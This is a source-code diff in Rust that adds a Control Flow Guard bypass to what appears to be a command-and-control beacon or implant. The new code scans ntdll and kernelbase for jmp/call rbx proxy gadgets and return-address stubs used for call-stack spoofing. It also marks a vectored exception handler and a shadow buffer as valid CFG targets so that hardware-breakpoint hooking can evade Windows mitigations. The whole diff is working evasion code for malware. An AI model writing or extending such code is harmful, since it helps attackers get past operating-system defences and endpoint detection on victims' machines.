@@ -96,6 +96,31 @@ static mut SHADOW_BUF: *mut u8 = core::ptr::null_mut();
 pub(crate) static VEH_SAFE: core::sync::atomic::AtomicBool =
     core::sync::atomic::AtomicBool::new(true);
 
+/// Initialize CFG bypass subsystem. Called during bootstrap.
+/// Scans for proxy gadgets and return-address stubs in system DLLs.
+/// The gadgets are available for future sync-exception proxy flows
+/// (Micro-Stager). For async HWBP exceptions, CFG marking + direct
+/// VEH registration is the current path.
+///
+/// # Safety
+/// Must run after PEB-walk bootstrap. Single-threaded beacon context.
+pub unsafe fn init_countermeasures() {
+    // Scan for proxy gadgets (jmp rbx / call rbx in ntdll/kernelbase).
+    if !crate::proxy_veh::proxy_available() {
+        crate::proxy_veh::init_proxy_gadgets();
+    }
+    if crate::proxy_veh::proxy_available() {
+        diag(b'G'); // gadget found
+    }
+
+    // Scan for return-address stub (ADD RSP,X; RET or bare RET in ntdll).
+    if let Some(stub) = crate::caller_spoof::scan_return_stub() {
+        diag(b'R'); // stub found
+        // Store for future use by caller-spoof thunk.
+        let _ = stub;
+    }
+}
+
 /// Runtime switch for diag() file writes. Defaults OFF in production.
 /// Set to true via `set_diag_enabled(true)` during selftest only.
 pub(crate) static DIAG_ENABLED: core::sync::atomic::AtomicBool =
@@ -543,6 +568,15 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     // Register VEH if not done (MUST be before setting breakpoints).
     if VEH_HANDLE.is_null() {
         diag(b'd'); // registering VEH
+
+        // ---- CFG bypass: mark handler as valid indirect-call target ----
+        if crate::cfg_user::cfg_enabled() {
+            crate::cfg_user::mark_addr_cfg_valid(hwbp_veh_handler as usize);
+            if !SHADOW_BUF.is_null() {
+                crate::cfg_user::mark_addr_cfg_valid(SHADOW_BUF as usize);
+            }
+        }
+
         let addr =
             match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler") {
                 Some(a) => a,
